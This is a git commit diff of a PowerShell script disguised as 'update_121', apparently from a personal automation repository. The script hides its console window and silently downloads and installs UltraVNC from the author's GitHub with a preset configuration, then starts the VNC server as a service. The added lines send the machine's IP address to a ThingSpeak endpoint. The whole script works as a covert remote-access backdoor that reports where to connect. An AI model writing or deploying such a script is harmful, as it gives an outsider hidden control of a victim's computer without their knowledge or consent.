7d056978f033e6162491229dd167b06c3915c568
Saurabh Patel <srbhptl39@gmail.com>
2019-07-28 10:44:00 +0530

    Update update_121.ps1

--- update_121.ps1
+++ update_121.ps1
@@ -8,15 +8,18 @@ $consoleHWND = [Console.Window]::GetConsoleWindow();
 $consoleHWND
 [Console.Window]::MoveWindow($consoleHWND,0,0,1,1);
 cd $Env:USERPROFILE -ErrorAction Stop
-Start-Sleep -Seconds 1 -ErrorAction Stop
+#Start-Sleep -Seconds 1 -ErrorAction Stop
 $client = new-object System.Net.WebClient -ErrorAction Stop
-Start-Sleep -Seconds 1 -ErrorAction Stop
-$client.DownloadFile("https://www.uvnc.eu/download/1224/UltraVNC_1_2_24_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
+#Start-Sleep -Seconds 1 -ErrorAction Stop
+$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/update_121.exe","$Env:USERPROFILE\update_121.exe") ;
 $client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
 & $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
 Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
-Start-Sleep -Seconds 1 -ErrorAction Stop
+#Start-Sleep -Seconds 1 -ErrorAction Stop
 & 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
-Start-Sleep -Seconds 1 -ErrorAction Stop
+#Start-Sleep -Seconds 1 -ErrorAction Stop
 & 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
+$ipa=(Test-Connection -ComputerName $env:computername -count 1).IPV4Address.
+$url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa"
+Invoke-WebRequest $url -Method Get
 exit
